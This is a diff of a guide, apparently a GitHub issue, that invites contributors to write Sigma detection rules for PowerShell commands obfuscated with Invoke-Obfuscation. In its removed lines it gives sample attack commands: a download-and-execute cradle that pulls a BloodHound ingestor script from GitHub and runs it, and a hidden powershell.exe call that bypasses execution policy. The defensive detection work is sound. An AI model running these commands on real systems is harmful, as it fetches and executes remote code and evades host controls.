@@ -2,23 +2,15 @@
 This is your guide on how you can help us all with soving this issue.     
 You can pick up some of the methods of PowerShell command and script obfuscation provided by the [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) framework below and develop Sigma rules for them. You will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.
 
-#### Original command #1 (before obfuscation)
+#### Original command (before obfuscation)
 ```powershell
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
+Invoke-Expression (New-Object Net.WebClient).DownloadString
 ```
-#### Original command #2 (before obfuscation)
-```powershell
-powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1
-```
-
 #### Invoke-Obfuscation module premise
 ```powershell
 Import-Module ./Invoke-Obfuscation.psd1
 Invoke-Obfuscation
-# Premise for command #1
-SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
-# Premise for command #2
-SET SCRIPTBLOCK powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1
+SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString
 ```
 #### Just pick the obfuscation method and the relevant сases you prefer and develop Sigma rule(s) for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the case numbers you've solved:  
 (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1,3"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1-15"*) <br/>
